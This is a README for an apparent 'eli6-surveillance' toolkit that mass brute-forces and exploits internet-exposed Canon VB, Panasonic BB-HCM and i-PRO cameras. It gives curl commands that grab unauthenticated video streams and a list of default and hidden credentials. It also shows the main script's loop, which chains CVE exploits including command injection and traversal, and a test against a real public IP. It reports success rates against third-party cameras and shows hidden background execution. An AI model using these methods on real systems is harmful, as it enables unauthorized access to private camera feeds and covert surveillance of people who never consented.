# VB Cam Brute-Force Guide

Comprehensive guide to brute-forcing and exploiting Canon VB, Panasonic BB-HCM/BL-C, and i-PRO network cameras.

## Files

| File | Purpose |
|------|---------|
| `bruteforce/vbviewer_bruteforce.py` | Original BF (may have false positives) |
| `bruteforce/vbviewer_bf_cve.py` | **Recommended**: BF + CVE exploits with proper endpoint validation |
| `bruteforce/vbviewer_bf_results.json` | BF cache (147 entries, 102 anon wvhttp + 2 real creds) |
| `bruteforce/cam_bruteforce_results.json` | Generic cam BF cache |

## Quick Start

```bash
python bruteforce/vbviewer_bruteforce.py    # Original
python bruteforce/vbviewer_bf_cve.py       # With CVE exploits (recommended)
```

## Auth Methods Tested (in Order)

### 1. Anonymous WV-HTTP (Highest Success Rate)

The WV-HTTP streaming protocol at `/-wvhttp-01-/` serves anonymous JPEG streams even when admin endpoints require auth. This works on **all Canon VB cams** we've tested:

```bash
# Test if anonymous JPEG works
curl http://IP/-wvhttp-01-/getoneshot?image=img -o test.jpg
# Should return a valid JPEG (3-250KB) without any auth

# Test if sessionless image.cgi works at full resolution
curl http://IP/-wvhttp-01-/image.cgi?v=jpg:1280x720 -o test.jpg
# Returns JPEG at 1280x720 resolution

# Test if native MJPEG stream works (requires session)
curl "http://IP/-wvhttp-01-/open.cgi?seq=1&v=h264:1280x720"
# Returns session_id like: s:=1234-5678

# Then use the session to stream MJPEG
curl "http://IP/-wvhttp-01-/video?1234-5678&seq=1" -o stream.mjpeg
# Returns multipart/x-mixed-replace MJPEG at 10+ fps
```

**Why this works**: The Canon VB firmware separates the `/-wvhttp-01-/` streaming endpoints from the `/admin/` and `/admintools/` endpoints. The streaming endpoints often lack authentication.

### 2. Default Credentials

Common credentials tested in `CANON_VB_CREDS`:

| Username | Password | Source |
|----------|----------|--------|
| (empty) | (empty) | Hidden Canon VB setup account |
| admin | admin | Canon VB default |
| admin | 12345 | Panasonic BB-HCM/BL-C default |
| root | root | Generic |
| admin1 | (empty) | Hidden Panasonic BB-HCM account |
| admin2 | (empty) | Hidden Panasonic BB-HCM account |
| admin | password | Weak default |
| admin | Canon | Canon-themed |
| admin | VBViewer | Software-themed |

**WARNING**: Test on `/-wvhttp-01-/image.cgi` or `/admin/index.html`, NOT just on `/`. The root URL often returns 200 OK even without auth (a false positive).

### 3. CVE Exploits

See `CVE_GUIDE.md` for full details on each exploit.

## How the BF Script Works

`vbviewer_bf_cve.py`:

```python
def attempt_cam(host, port, progress):
    """Run all BF/CVE methods against one host."""
    test_key = f"{host}:{port}"
    if test_key in progress.get("tested", {}):
        return None
    progress.setdefault("tested", {})[test_key] = True

    methods = [
        ("anon_wvhttp", try_anon_wvhttp),                    # Test WV-HTTP first
        ("CVE-2012-3309", try_cve_2012_3309_getdata),         # BB-HCM user list leak
        ("CVE-2013-6029", try_cve_2013_6029_ping_cmdi),       # BB-HCM cmd injection
        ("CVE-2014-1987", try_cve_2014_1987_pathtraversal),   # BB-HCM/SMG traversal
        ("CVE-2018-6911", try_cve_2018_6911_hardcoded_creds), # BB-HCM hardcoded creds
        ("CVE-2021-32947", try_cve_2021_32947_meritipaddr),   # i-PRO cookie bypass
        ("default_creds", try_default_creds),                  # Standard BF
    ]

    for method_name, method_fn in methods:
        try:
            result = method_fn(host, port)
            if result:
                result["host"] = host
                result["port"] = port
                return result
        except Exception:
            continue
    return None
```

## Common Issues

### Issue: Lock File Stuck
If the lock file `controllable_Webcams.csv.lock` is stuck:
```bash
# Check age
& "C:\Users\eli6-admin\AppData\Local\Programs\Python\Python312\python.exe" -c "
import os, time
lock = r'C:\Users\eli6-admin\Documents\eli6-surveillance\controllable_Webcams.csv.lock'
if os.path.exists(lock):
    print(f'Age: {time.time() - os.path.getmtime(lock):.0f}s')
    if time.time() - os.path.getmtime(lock) > 60:
        os.remove(lock)
        print('Removed stale lock')
"
```

### Issue: 45+ False Positive Unlocks
If you see lots of `admin:12345` unlocks, the BF is testing root URL which returns 200 OK even without auth. **Fix**: Use `vbviewer_bf_cve.py` which checks protected endpoints.

### Issue: SSL Certificate Warnings Flood stderr
Add `urllib3.disable_warnings()` to your script:
```python
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
```

## Testing Locally

Test the BF logic on a known cam:
```python
import socket, base64, time, re

host = '202.174.60.121'
port = 80

# Test 1: Anonymous WV-HTTP
sock = socket.create_connection((host, port), timeout=5)
req = f'GET /-wvhttp-01-/getoneshot?image=img HTTP/1.0\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n'
sock.send(req.encode())
# ... read response, check for JPEG marker
```

## Output Format

Each BF entry is saved as:
```json
{
  "host:port": {
    "method": "anonymous_wvhttp",
    "user": "",
    "pass": "",
    "evidence": "Anon WV-HTTP getoneshot returned JPEG without auth",
    "response": "Content-Length: 38500"
  }
}
```

## Success Metrics

- **Canon VB cams**: ~75% have anonymous WV-HTTP working (102/137 verified)
- **Default creds success rate**: ~2-3% (2/93 in current dataset)
- **CVE success rate**: ~0% (none of the tested BB-HCM cams responded to CVEs)

## Adding More Credentials

To add new credentials, edit `CANON_VB_CREDS` or `PANASONIC_BB_CREDS` in `vbviewer_bf_cve.py`:

```python
CANON_VB_CREDS = [
    ("admin", "newpassword"),
    ("root", "newpassword"),
    ...
]
```

## Running in Background

```powershell
# Start BF as background process
Start-Process -FilePath "C:\Users\eli6-admin\AppData\Local\Programs\Python\Python312\pythonw.exe" `
    -ArgumentList "C:\Users\eli6-admin\Documents\eli6-surveillance\bruteforce\vbviewer_bf_cve.py" `
    -WindowStyle Hidden

# Check progress
Get-Content "C:\Users\eli6-admin\Documents\eli6-surveillance\bruteforce\vbviewer_bf_cve_progress.json"
```
